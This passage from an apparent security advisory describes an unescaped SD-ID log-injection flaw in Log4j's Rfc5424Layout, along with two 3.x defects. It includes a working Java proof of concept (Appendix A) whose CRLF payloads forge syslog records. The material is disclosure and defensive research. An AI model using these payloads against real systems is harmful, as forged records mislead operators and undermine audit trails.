250:            if (uri.getScheme() == null || uri.getScheme().equals(JAVA_SCHEME)) {
251:                return (T) this.context.lookup(name);
253:            LOGGER.warn("Unsupported JNDI URI - {}", name);
```

`JndiLookup` also throws `IllegalStateException` when JNDI is disabled. No bypass was found in
the scheme check — `java.net.URI.getScheme()` returns the original case and `equals` is
case-insensitive, so `JAVA:` does not slip through.

**The 3.x line was re-checked and is equally safe.** JNDI moved out of `log4j-core` into a
separate `log4j-jndi` module (`org.apache.logging.log4j.jndi.JndiManager`,
`org.apache.logging.log4j.jndi.lookup.JndiLookup`) and is not on the classpath unless an
application opts in. The gating is unchanged (`JndiManager.java:216`, `JndiLookup.java:48`).

### 9.2 The 2.26.0 plugin-API refactor did not silently drop any attribute

2.26.0 renamed builder methods wholesale (`withX` → `setX`) and moved the
`@PluginBuilderAttribute` annotations from setters to fields. A machine diff of every plugin
attribute name across 2.25.3 → 2.26.1 in `log4j-core`, `log4j-layout-template-json` and
`log4j-1.2-api` found **0 removed attribute names** — the renamed methods are retained as
`@Deprecated` aliases and the field-level annotations keep the XML/properties attribute names
stable. The CVE-2026-34478 failure mode is not reproduced in 2.26.x.

### 9.3 CVE-2026-34478 is genuinely fixed at 2.26.1

`Rfc5424Layout` at 2.26.1 honours both attributes: `newLineEscape` and `useTlsMessageFormat` are
`@PluginBuilderAttribute` fields (`:849`, `:952`), the deprecated `escapeNL` /
`useTLSMessageFormat` aliases remain, and the builder consumes them with
`Objects.toString(newLineEscape, escapeNL)` (`:1175`) and
`useTlsMessageFormat || useTLSMessageFormat` (`:1186`).
`SslSocketManager.java:378` applies `sslConfiguration.isVerifyHostName()`.

The finding in this document is a **different path**, not a regression of that one.

### 9.4 Structured-output layouts escape their content correctly

A 16-case battery of hostile inputs (raw control characters, NUL, quotes, backslashes, `]]>`,
`&`, NaN, Infinity, nested NaN, over-long strings, MDC injection) was run through `XmlLayout`,
`JsonTemplateLayout` (ECS), `HtmlLayout` and `Rfc5424Layout` with strict validators
(`xml.etree` parse, Python `json.loads` with non-standard constants rejected, HTML tag balance,
RFC 5424 line structure). **Every case produced well-formed output** — control characters, NUL,
quotes, backslashes, CDATA and `&` are all correctly escaped, and NaN/Infinity are rejected
(CVE-2026-34481 / CVE-2026-49844 confirmed fixed). The `Rfc5424Layout` MSG and PARAM paths are
sound; **the SD-ID is the single hole**.

| Layout | Escaping mechanism | Result |
|---|---|---|
| `XmlLayout` | `isValidXml10` / `appendSanitizedXml10`, XML entity escaping | Safe |
| `HtmlLayout` | `Transform.escapeHtmlTags` / `escapeHtmlEntities` | Safe |
| `JsonTemplateLayout` | `JsonWriter.writeString` / `quoteAsString` | Safe |
| `JsonLayout`, `YamlLayout` | `AbstractJacksonLayout` → Jackson (JSON / YAML factories) | Safe |
| `GelfLayout` | `JsonUtils.quoteAsString` on `short_message`, `full_message`, `_additionalField` keys **and** values, and MDC/`MapMessage` entries (`:701-703`, `:720-742`, `:773-775`) | Safe |
| `CsvLogEventLayout`, `CsvParameterLayout` | Apache Commons CSV `CSVFormat.print(...)` — RFC 4180 quoting | Safe |
| `SyslogLayout` | `NEWLINE_PATTERN.matcher(message).replaceAll(escapeNewLine)` across the whole message (`:157` 2.x / `:169` 3.x) | Safe |
| `PatternLayout` | **None** | Not a differential — a plain-text format; applies equally to the application's own message |
| **`Rfc5424Layout`** | MSG, PARAM-NAME, PARAM-VALUE escaped — **SD-ID not** | **The finding** |

`PatternLayout` performs no escaping of the message, MDC or throwable. That is inherent to a
plain-text format rather than a defect, and it applies equally to any message content, so it is
not counted as a Log4j-specific issue. It is noted because it highlights what makes this finding
distinctive: `Rfc5424Layout` is a *structured* format that **does** escape its message, its
parameter names and its parameter values — and then fails to escape one more attacker-reachable
field sitting right beside them.

### 9.5 Reachability analysis

| Path | SD-ID source | Attacker-influenced? |
|---|---|---|
| `new StructuredDataMessage(id, msg, type)` | application | **Yes** — `id` is a plain application-supplied string |
| `new StructuredDataMessage(id, msg, type, maxLength)` | application | **Yes** — and the length limit is lifted |
| `new StructuredDataMessage(StructuredDataId, …)` | application | **Yes** — `StructuredDataId` performs no character validation |
| `StructuredDataMessage(Map<String,String>)` | application | **Yes** — the map's first key becomes the SD-ID |
| `Rfc5424Layout` `mdcId` attribute | operator configuration | No (config-controlled) |
| `Rfc5424Layout` `loggerFields` / `loggerField` `sdId` | operator configuration | No (config-controlled) |
| `Rfc5424Layout` `id` attribute (default SD-ID) | operator configuration | No (config-controlled) |

The application-supplied paths are the realistic ones.

### 9.6 Log4j 1.x (end-of-life)

Log4j 1.2 never received fixes for CVE-2019-17571 (SocketServer deserialization),
CVE-2021-4104 (JMSAppender), CVE-2022-23302/23305/23307 (Chainsaw SQL injection, JMSSink,
JDBCAppender SQL injection) or CVE-2020-9488. The `log4j-1.2-api` bridge shipped with Log4j 2
does **not** carry these appenders, but a `log4j-1.2-api` deployment can still be configured to
reach `PropertyConfigurator` substitution. Any project still shipping `log4j:log4j:1.2.17`
should be treated as permanently vulnerable — there is no upgrade path inside 1.x.

Log4j 1.x has no `Rfc5424Layout` and no `StructuredDataMessage`, so this specific finding does
not apply to it.

### 9.7 The 2.26.0 rewrite of `RollingFileAppender`, `LoggerConfig` and `PluginProcessor`

The 2.26.0 refactor also rewrote `RollingFileAppender` (+176), `RollingFileManager` (−240),
`LoggerConfig` (+234) and `PluginProcessor` (+93). These were reviewed for security-relevant
behaviour change (rollover path traversal, file-permission handling, appender routing, plugin
attribute injection). No escaping, validation or path-handling regression was identified. The
`JmxRuntimeInputArgumentsLookup` removal is a hardening (it exposed JVM runtime arguments via
MDC).

### 9.8 `AsyncAppender` batch integrity

`AsyncAppender.append()` hands each event to the queue, and the dispatcher processes events
individually: `AsyncAppenderEventDispatcher.dispatch()` catches `Throwable` per appender
(`:129`). A failure in one event's append does not discard the other queued events. No
"one poisoned event suppresses other users' records" behaviour was found — the failure mode
described by CVE-2026-105241 in Log4net does not reproduce in Log4j 2.x's async path.

### 9.9 `SerializedLayout`

`SerializedLayout` writes a Java-serialized `LogEvent` via a `PrivateObjectOutputStream`
(`SerializedLayout.java:67-68`, `:114-116`) that overrides `writeClassDescriptor` to restrict
the gadget surface. It is reachable as an appender layout (`@Plugin(name = "SerializedLayout",
elementType = Layout.ELEMENT_TYPE)`), so a consumer that deserializes the stream with a plain
`ObjectInputStream` would be exposed to Java deserialisation — but that is a property of the
*consumer*, not a Log4j-side output-neutralisation defect, and it is outside the scope of this
finding.

---

## 10. Additional findings

The audit that produced §1–§9 also compared the Log4j 3.x line against its 2.x counterparts. Two
further defects were found, and both were live-proven. They are the same family as the primary
finding — a single value silently corrupts the log stream — and both affect the 3.x line only.

| Identifier | Component | Class | Severity | Affected |
|---|---|---|---|---|
| [`LOG4J-RFC5424-ATTR-DRIFT`](#101-loglj-rfc5424-attr-drift) | `Rfc5424Layout` (log4j-core) | CWE-117 · CWE-1188 | Medium–High | Log4j 3.0.0-beta2, 3.0.0-beta3, `origin/main` |
| [`LOG4J-JSON-NONFINITE`](#102-loglj-json-nonfinite) | `log4j-layout-template-json` | CWE-20 · CWE-1330 | Medium | Log4j 3.0.0-beta2, 3.0.0-beta3, `origin/main` |

Neither has a CVE, and neither is fixed. Raw evidence for both is in
[`docs/evidence/`](docs/evidence/): [`poc-attr-drift.txt`](docs/evidence/poc-attr-drift.txt) and
[`poc-json-nonfinite.txt`](docs/evidence/poc-json-nonfinite.txt).

### 10.1 LOG4J-RFC5424-ATTR-DRIFT

**One line.** A `Rfc5424Layout` configuration carried over from Log4j 2.x loses its
newline-escaping control on Log4j 3.x, the raw newline reaches the collector, and the collector
reads it as a second syslog record.

#### What

Log4j 2.x accepts **two spellings** for every `Rfc5424Layout` attribute that controls record
framing, and merges them in the builder:

```java
// log4j-core/src/main/java/org/apache/logging/log4j/core/layout/Rfc5424Layout.java (rel/2.26.1)
832:        @PluginBuilderAttribute
833:        private boolean newLine;
...
840:        @PluginBuilderAttribute
841:        private boolean includeNL;
...
848:        @PluginBuilderAttribute
849:        private String newLineEscape;
...
856:        @PluginBuilderAttribute
857:        private String escapeNL;
...
1174:                    newLine || includeNL,
1175:                    Objects.toString(newLineEscape, escapeNL),
1183:                    Objects.toString(mdcRequired, required),
1186:                    useTlsMessageFormat || useTLSMessageFormat,
```

The 2.x builder's own comments record the intent (`Rfc5424Layout.java:836-838` and `:852-854`):
*"Same as `newLine` … Erroneously introduced in version 2.21.0, but kept for compatibility."*
Both spellings are honoured, so a configuration written for either one works.

**Log4j 3.x keeps only one spelling of each, and which one depends on the release.** The 3.x
plugin system has no attribute-alias mechanism — `@PluginBuilderAttribute` carries a single name,
and `PluginAliases` applies to element types, not attributes — so the second spelling is simply
gone. The result:

| Attribute | 2.26.1 | 3.0.0-beta2 | 3.0.0-beta3 (latest 3.x) | `origin/main` † |
|---|---|---|---|---|
| append the record terminator | `newLine` **or** `includeNL` | `newLine` | `includeNL` | `includeNL` |
| escape newlines in the MSG field | `newLineEscape` **or** `escapeNL` | `newLineEscape` | `escapeNL` | `escapeNL` |
| RFC 5425 octet-counted framing | `useTlsMessageFormat` **or** `useTLSMessageFormat` | both | both | `useTLSMessageFormat` |
| MDC field selection | `mdcExcludes`/`mdcIncludes`/`mdcRequired` **or** `excludes`/`includes`/`required` | `mdc*` | `excludes`/`includes`/`required` | `excludes`/`includes`/`required` |

† The `origin/main` column is read from the 3.x source (`origin/main`, `3.0.0-SNAPSHOT`); the
other three columns are measured by configuring each attribute on its own and reading back the
startup diagnostics — see [§10.1](#101-loglj-rfc5424-attr-drift), "Which attribute spellings each
release accepts", in
[`docs/evidence/poc-attr-drift.txt`](docs/evidence/poc-attr-drift.txt).

Note the direction of the break. **2.x accepts both spellings of every one of these attributes.**
3.x accepts one — and which one depends on the release: 3.0.0-beta2 still takes the 2.x names for
the newline controls, 3.0.0-beta3 no longer does. A configuration written for 2.x therefore
works on 3.0.0-beta2 and stops working on 3.0.0-beta3, and a configuration written for 3.x does
the opposite. There is no spelling that survives both.

An unknown attribute does not abort the configuration. It is reported once, at startup, and then
ignored:

```
ERROR StatusConsoleListener Rfc5424Layout contains invalid attributes "includeNL", "escapeNL"
```

The layout is built anyway, with the corresponding control switched off.

#### Live proof

One event, one message containing an embedded newline. The only variable is which spelling the
configuration uses. Full transcript:
[`docs/evidence/poc-attr-drift.txt`](docs/evidence/poc-attr-drift.txt).

```
--- 2.26.1  newLine + newLineEscape ---          <-- control
  startup: (no configuration diagnostics)
  repr    : b'... line-one\\nline-two\n'
  records : 1

--- 3.0.0-beta3  newLine + newLineEscape ---     <-- a 2.x configuration, on 3.x
  startup: ERROR Rfc5424Layout contains invalid attributes "newLine", "newLineEscape"
  repr    : b'... line-one\nline-two'
  records : 2
```

The 2.x configuration on 3.0.0-beta3 emits **two** syslog records from one log event. The newline
is raw. The collector will parse the first line as a truncated record and the second line — whose
`HOSTNAME`, `APP-NAME`, `PROCID`, `MSGID` and message body are all attacker-influenced — as a
complete record of its own.

#### Impact

* **The same impact as the primary finding, reached differently.** An attacker who can put a
  newline in a log message gets a forged record appended to the stream.
* **It is a migration-time failure, and it is silent.** An operator upgrading from 2.x to 3.x
  copies their configuration across. The security-relevant attribute stops being recognised, one
  ERROR is printed during startup, and the layout is built with the protection disabled. Log4j
  does not refuse to start.
* **It defeats CVE-2026-34478 on the line where the fix never landed.** CVE-2026-34478 was
  issued for exactly this failure mode — `newLineEscape` silently not being honoured — and was
  fixed on 2.x in 2.25.4. The 3.x line reproduces the original defect rather than the fix.
* **The MDC attributes fail the same way**, in the opposite direction: `mdcExcludes`/`mdcIncludes`/
  `mdcRequired` dropped means the MDC field-selection rules are dropped, and MDC content that the
  operator explicitly excluded from the record is emitted into it.

#### Severity

Medium–High. Same class as CVE-2026-34478 (CVSS 4.0 **6.9 MEDIUM**), and the same impact as the
primary finding, but it requires a configuration migration rather than a reachable code path, and
it is disclosed by one ERROR line at startup.

#### Remediation

* **User-side, immediately:** on Log4j 3.x use `includeNL="true"`, `escapeNL="&#92;n"`,
  `useTLSMessageFormat="true"`, and `excludes`/`includes`/`required`. Do not copy a 2.x
  `Rfc5424Layout` element across unchanged.
* **Upstream:** restore the aliases 2.x had — accept both spellings, as `Rfc5424Layout.java:1174`
  and `:1175` do on 2.x — so that a configuration written for either spelling keeps its security
  controls on 3.x.

### 10.2 LOG4J-JSON-NONFINITE

**One line.** The CVE-2026-34481 fix was never ported to the 3.x line, so a `JsonTemplateLayout`
on Log4j 3.x can emit a non-finite number as a bare `NaN` token — which is not valid JSON.

#### What

CVE-2026-34481 was *"invalid JSON produced by `JsonTemplateLayout` for non-finite numbers"*. The
2.x fix, in `JsonWriter`, is a finite-value guard:

```java
// log4j-layout-template-json/src/main/java/org/apache/logging/log4j/layout/template/json/util/JsonWriter.java
// rel/2.26.1 — fixed
733:    public void writeNumber(final double number) {
734:        // Follows the same logic as Jackson's JsonWriteFeature#WRITE_NAN_AS_STRINGS feature.
735:        if (!Double.isFinite(number)) {
736:            writeString(Double.toString(number));
737:        } else {
738:            stringBuilder.append(number);
739:        }
740:    }
```

```java
// rel/3.0.0-beta2 — the fix is not here
727:    public void writeNumber(final float number) {
728:        stringBuilder.append(number);
729:    }
730:
731:    public void writeNumber(final double number) {
732:        stringBuilder.append(number);
733:    }
```

The 3.x `log4j-layout-template-json` module was forked from the pre-fix code and never received
the guard. `rel/3.0.0-beta3` is the same.

#### Live proof

One event whose message carries a `Double.NaN`, serialised by a `JsonTemplateLayout` that
resolves the message as an object. Full transcript:
[`docs/evidence/poc-json-nonfinite.txt`](docs/evidence/poc-json-nonfinite.txt).

```
--- 2.26.1 ---
  output : {"message":{"measurement":"NaN","other":1.5}}
  parse  : VALID JSON (RFC 8259)

--- 3.0.0-beta3 ---
  output : {"message":{"measurement":NaN,"other":1.5}}
  parse  : INVALID JSON - non-JSON constant emitted: NaN
```

RFC 8259 has no `NaN` literal. The 2.x output quotes it as the string `"NaN"`; the 3.x output
emits the bare token, and a strict parser rejects the document.

#### Impact

* **The emitted record is not valid JSON.** Every strict JSON consumer downstream — Filebeat's JSON
  decoder, Vector, Fluent Bit's JSON parser, SIEM ingestion — rejects or truncates the record.
  A single event with a non-finite number can therefore drop a log line.
* **The stream can be corrupted, not just the record.** Because the token is bare, a crafted value
  can terminate or truncate the surrounding JSON structure.
* **The same defect that was assigned a CVE on 2.x is unfixed on 3.x.** The 2.x line has been
  clean since 2.25.4.

#### Severity

Medium. Availability and integrity of the log stream rather than authentication or code
execution — the same severity band as CVE-2026-34481, for the same reason.

#### Remediation

* **User-side:** do not put non-finite `Double`/`Float` values into log messages, or normalise
  them before logging (`Double.isFinite(v) ? v : 0.0`).
* **Upstream:** port the 2.x guard into the 3.x `JsonWriter` — the change is four lines and
  already exists on the other branch of the same repository.

## 11. Related advisories

### 11.1 Comparison with CVE-2026-34478

CVE-2026-34478 (CVSS 4.0: **6.9 MEDIUM**, fixed in 2.25.4) was *"log injection in
`Rfc5424Layout` due to silent configuration incompatibility"* — the `newLineEscape` and
`useTlsMessageFormat` attributes had been silently renamed, so escaping silently stopped
working.

| | CVE-2026-34478 | This finding |
|---|---|---|
| Injection point | configuration attribute | message content (SD-ID) |
| Versions affected | 2.21.0 – 2.25.3 | **all 2.x (incl. 2.26.1, 2.27.0-SNAPSHOT) and all 3.x (incl. 3.0.0-beta2, 3.0.0-beta3)** |
| Fixed? | yes, 2.25.4 | **no** |
| Bypasses `newLineEscape`? | it *disabled* `newLineEscape` | **yes — `newLineEscape` is honoured but not applied to the SD-ID** |
| Root cause | a refactor | a missing validation |

### 11.2 The 2025/2026 advisory batch

All Log4j-Core entries were reviewed against the 2.26.1 source to confirm the fixes are actually
present:

| CVE | Issue | Affected | Fixed in | Present in 2.26.1? |
|---|---|---|---|---|
| CVE-2021-44228 | Log4Shell JNDI RCE | ≤ 2.15.0 | 2.15.0/2.16.0 | No — JNDI gated, §9.1 |
| CVE-2021-45046 | Incomplete Log4Shell fix | 2.15.0 | 2.16.0 | No |
| CVE-2021-44832 | JDBC Appender RCE | ≤ 2.17.0 | 2.17.1 | No |
| CVE-2021-45105 | Uncontrolled recursion | ≤ 2.16.0 | 2.16.0 | No |
| CVE-2020-9488 | SMTP cert validation | ≤ 2.13.1 | 2.13.2 | No |
| CVE-2017-5645 | TCP/UDP deserialization | ≤ 2.8.1 | 2.8.2 | No |
| CVE-2018-1285 | SocketServer deserialization | 1.2.x | EOL | n/a |
| CVE-2025-68161 | SocketAppender skips TLS hostname verification | ≤ 2.25.2 | 2.25.3 | No — `SslSocketManager.java:378` honours `verifyHostName` |
| CVE-2026-34477 | `verifyHostName` silently ignored | ≤ 2.25.3 | 2.25.4 | No |
| CVE-2026-34478 | `newLineEscape`/`useTlsMessageFormat` silently renamed | 2.21.0–2.25.3 | 2.25.4 | No — both attributes honoured at 2.26.1 (`:952`, `:1175`, `:1186`) |
| CVE-2026-34479 | `Log4j1XmlLayout` XML 1.0 forbidden chars | ≤ 2.25.3 | 2.25.4 | No |
| CVE-2026-34480 | `XmlLayout` XML 1.0 forbidden chars | ≤ 2.25.3 | 2.25.4 | No — verified live, §9.4 |
| CVE-2026-34481 | `JsonTemplateLayout` NaN → invalid JSON | ≤ 2.25.3 | 2.25.4 | No — verified live, §9.4 |
| CVE-2026-49844 | `MapMessage.asJson()` NaN | ≤ 2.25.4 / 2.26.0 | 2.25.5 / 2.26.1 | No — verified live, §9.4 |

The six newest advisories (**CVE-2026-105239 … CVE-2026-105244**, published 2026-06) all affect
**Apache Log4net** (the .NET port), not Log4j 2.x. Every one is the same class as this finding —
a single untrusted value silently corrupts, truncates or destroys log records — which is what
motivated the message-content fuzzing pass in §9.4.

---

## 12. Disclosure

### 12.1 Status

| | |
|---|---|
| **State** | Publicly disclosed in this repository, 2026-10-23. |
| **Repository** | <https://github.com/vindeckyy/log4j-log-injection> |
| **Vendor notified** | **No.** The Apache Logging Services security team has not been contacted. |
| **CVE** | None assigned as of 2026-10-23. |
| **Upstream fix** | None, on any branch of either line (verified 2026-10-23 — §6). |
| **Vendor contact** | `security@apache.org` — Apache Logging Services security team |
| **Vendor policy** | <https://logging.apache.org/security.html> |

**This repository is the disclosure.** The write-up, the proof of concept and the raw evidence
are published here so the defect is on the record and reproducible by anyone who reads it.

Publishing it here does **not** mean the vendor has been told. It has not: `security@apache.org`
has not been contacted, no CVE has been requested, and no fix is in flight. That is stated
plainly because a reader has to be able to tell the difference between "there is a known issue
being worked on upstream" and "nobody upstream knows yet". The second case is the situation
here — deployments are carrying the risk today, and the fastest route to a fix is to forward
this to upstream yourself.

### 12.2 If you maintain Log4j

The fix is small and the change is already drafted — see [§7.1](#71-proposed-upstream-patch).
What upstream would need:

* Acknowledgement, and a named committer for the fix.
* A fix on **both** `origin/2.x` and `origin/main` — a 2.x-only fix leaves Log4j 3.x
  exploitable.
* Confirmation of whether the `StructuredDataId` constructor should also enforce the
  character set, or whether the fix is output-side only.
* A CVE identifier for the 2.x line and one for the 3.x line, if the vendor treats them
  separately.

### 12.3 If you operate Log4j

Until a fix exists, [§7.4](#74-user-side-workarounds) lists the mitigations that work. The
short version: do not let untrusted data reach an SD-ID. If it already does, treat the affected
collector as untrustworthy, because the log stream it receives can contain records that the
application never produced.

### 12.4 Disclosure policy for this repository

See [`SECURITY.md`](SECURITY.md).

---

## 13. Reproducing this audit

### 13.1 Tooling

| Tool | Used for |
|---|---|
| `git` (blobless clone of `apache/logging-log4j2`) | Source inspection across every ref |
| `javap` | Bytecode inspection of the 3.x `StructuredDataId` and of the `Rfc5424Layout` / `JsonWriter` builders in each release |
| `curl` | Maven Central artifacts; Apache advisory; NVD API 2.0; CISA KEV |
| `openjdk` 21.0.12 | Running the PoC against real released artifacts |
| `python3` | Localhost syslog sink, output validators, the scanner |

### 13.2 Method

1. **Advisory-driven triage.** Parsed the Apache advisory (24 CVE sections) and the NVD CVE API
   2.0 `keywordSearch=log4j` result (34 records), cross-checked against the CISA KEV catalog, and
   built a version-range table.
2. **Source-level verification.** For every Log4j-Core entry, the fix was verified present in the
   2.26.1 tree rather than assumed from the advisory.
3. **Structural diff.** Extracted both the 2.25.3 and 2.26.1 trees and machine-diffed every
   `@PluginBuilderAttribute` / `@PluginAttribute` name across `log4j-core`,
   `log4j-layout-template-json` and `log4j-1.2-api`, to catch the CVE-2026-34478
   "silently renamed attribute" class in bulk. Result: **0 removed attribute names** on the 2.x
   line (§9.2). The same diff run against the 3.x tree is what surfaced
   [§10.1](#101-loglj-rfc5424-attr-drift).
4. **Live differential testing.** Exercised the real 2.17.1 / 2.24.3 / 2.26.1 / 3.0.0-beta2 /
   3.0.0-beta3 jars against hostile inputs with content-preservation assertions, and against a
   localhost syslog sink.
5. **Independent review.** A separate read-only review pass covered every layout plus the async
   appender chain (`AsyncAppender`, `AsyncAppenderEventDispatcher`, `RingBuffer`,
   `AppenderControl`). Each conclusion it reached was re-verified against the source and, where
   observable, against the live jars.
6. **3.x coverage.** The same defect was re-verified on the Log4j 3 line: source comparison
   across `origin/main` and `rel/3.0.0-alpha1`…`rel/3.0.0-beta3`; bytecode inspection of
   `StructuredDataId` in `log4j-api` 3.0.0-beta2; and live runs of the identical PoC against
   both released 3.x stacks (3.0.0-beta2 and 3.0.0-beta3), the latter with newline escaping
   enabled via the renamed 3.x attributes.
7. **Attribute probe.** For each release of each line, every candidate `Rfc5424Layout`
   attribute was configured on its own and the startup diagnostics read back, so "which spelling
   does this version accept" is a measured answer rather than an inference from the source
   ([§10.1](#101-loglj-rfc5424-attr-drift)).
8. **Cross-line CVE regression.** For CVE-2026-34481, the 2.x fix was bisected
   (2.25.3 → 2.25.4) and then the same event was replayed against both 3.x releases to establish
   that the fix was never ported ([§10.2](#102-loglj-json-nonfinite)).

All testing was contained: **localhost sockets only, no traffic to third parties.**

### 13.3 Evidence index

| File | Contents |
|---|---|
| [`docs/evidence/poc-2.x.txt`](docs/evidence/poc-2.x.txt) | Verbatim PoC transcripts, Log4j 2.26.1 — all six modes, file appender and TCP wire bytes |
| [`docs/evidence/poc-3.x.txt`](docs/evidence/poc-3.x.txt) | Verbatim PoC transcripts, Log4j 3.0.0-beta2 and 3.0.0-beta3 — all six modes each |
| [`docs/evidence/scanner-output.txt`](docs/evidence/scanner-output.txt) | `log4j_audit.py` output against 2.x and 3.x artifacts |
| [`docs/evidence/source-rfc5424layout-2.26.1.txt`](docs/evidence/source-rfc5424layout-2.26.1.txt) | Annotated source, 2.26.1 |
| [`docs/evidence/source-rfc5424layout-3.x.txt`](docs/evidence/source-rfc5424layout-3.x.txt) | Annotated source, 3.0.0-SNAPSHOT |
| [`docs/evidence/source-structureddataid-2.26.1.txt`](docs/evidence/source-structureddataid-2.26.1.txt) | Annotated source, 2.26.1 |
| [`docs/evidence/source-structureddataid-3.x-bytecode.txt`](docs/evidence/source-structureddataid-3.x-bytecode.txt) | Bytecode, `log4j-api` 3.0.0-beta2 |
| [`docs/evidence/poc-attr-drift.txt`](docs/evidence/poc-attr-drift.txt) | Verbatim transcripts for `LOG4J-RFC5424-ATTR-DRIFT` — the newline-escaping matrix and the per-attribute acceptance probe |
| [`docs/evidence/poc-json-nonfinite.txt`](docs/evidence/poc-json-nonfinite.txt) | Verbatim transcripts for `LOG4J-JSON-NONFINITE` — the emitted JSON and a strict RFC 8259 parse verdict for five releases |
| [`docs/evidence/capture_evidence.sh`](docs/evidence/capture_evidence.sh) | Regenerates the transcripts above |
| [`docs/evidence/capture_attr_drift.sh`](docs/evidence/capture_attr_drift.sh) | Regenerates `poc-attr-drift.txt` |
| [`docs/evidence/capture_json_nonfinite.sh`](docs/evidence/capture_json_nonfinite.sh) | Regenerates `poc-json-nonfinite.txt` |
| [`docs/evidence/PluginAttrs.java`](docs/evidence/PluginAttrs.java) | Prints the configuration attributes a plugin builder accepts, for comparing releases |

---

## Appendix A — PoC source

The driver is short enough to include in full. It uses only public API.

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.message.StructuredDataMessage;

public class SdIdPoC {

    public static void main(final String[] args) {
        final String mode = args.length > 0 ? args[0] : "baseline";
        final Logger log = LogManager.getLogger("POC");
        switch (mode) {
            case "baseline":
                log.info(new StructuredDataMessage("goodId", "k", "v"));
                break;
            case "breakout":
                log.info(new StructuredDataMessage("x] INJECTED 1 - host app - - -", "k", "v"));
                break;
            case "crlf":
                log.info(new StructuredDataMessage("x]\r\n<134>1 FORGED host app - - -", "k", "v"));
                break;
            case "forge32":
                log.info(new StructuredDataMessage("x]\r\n<1>1 - evil - - - FORGED", "k", "v"));
                break;
            case "forgebig":
                log.info(new StructuredDataMessage(
                        "x]\r\n<1>1 2026-10-23T00:00:00Z evilhost evilapp 999 evilmsg - FORGED MESSAGE BODY HERE",
                        "k", "v", 256));
                break;
            case "einnl":
                log.info(new StructuredDataMessage("id@1 evil\r\nINJECT2", "k", "v"));
                break;
            default:
                log.info("unknown mode " + mode);
        }
        LogManager.shutdown();
    }
}
```

Full source: [`poc/SdIdPoC.java`](poc/SdIdPoC.java).

## Appendix B — Glossary

| Term | Meaning |
|---|---|
| **SD-ID** | The name of an RFC 5424 structured-data element. `exampleSDID@32473`. |
| **SD-NAME** | The RFC 5424 production that constrains the SD-ID: printable US-ASCII except SPACE, `]`, `=`, `"`. |
| **PARAM-NAME / PARAM-VALUE** | The key/value pairs inside a structured-data element. |
| **STRUCTURED-DATA** | The bracketed section of an RFC 5424 record, e.g. `[id@1 k="v"]`. |
| **PRI** | The RFC 5424 priority value (`<134>`), encoding facility and severity. |
| **RFC 5424** | The syslog protocol Log4j's `Rfc5424Layout` implements. |
| **RFC 5425** | The TLS transport for syslog, with octet-counted framing. |
| **RFC 6587** | The plain-TCP transport for syslog, with newline framing. |
| **CVE-2026-34478** | The earlier `Rfc5424Layout` log-injection advisory (attribute silently renamed). Fixed in 2.25.4 — on the 2.x line only; see §10.1. |
| **CVE-2026-34481** | The earlier `JsonTemplateLayout` advisory (non-finite numbers produced invalid JSON). Fixed in 2.25.4 — on the 2.x line only; see §10.2. |
| **Attribute drift** | A configuration attribute that a release no longer recognises. The attribute is reported once at startup and then discarded, and whatever it controlled stops being controlled. |

## Appendix C — Document changelog

| Date | Change |
|---|---|
| 2026-10-23 | Initial report. Finding confirmed and live-proven on Log4j 2.17.1, 2.24.3, 2.26.1 and 3.0.0-beta2. Branch mapping corrected (`origin/main` is the 3.x line, not 2.27.0-SNAPSHOT). 3.x scope added. |
| 2026-10-23 | Two further findings added after a 3.x-vs-2.x attribute and module comparison: `LOG4J-RFC5424-ATTR-DRIFT` (§10.1) and `LOG4J-JSON-NONFINITE` (§10.2). Both live-proven; evidence added under `docs/evidence/`. |
| 2026-10-23 | Disclosure status changed from private/coordinated to a public disclosure in this repository; §12 and `SECURITY.md` rewritten to say plainly that the vendor has not been notified. |
| 2026-10-23 | 3.0.0-beta3 upgraded from source-inspection only to **live-proven**: the working 3.x stack is `log4j-kit` + `log4j-core` + `log4j-plugins` at 3.0.0-beta3 plus `log4j-api:2.24.1` (§6.4). The beta3 run enables newline escaping via the renamed 3.x attributes and the CRLF still reaches the wire, which strengthens the primary finding. |
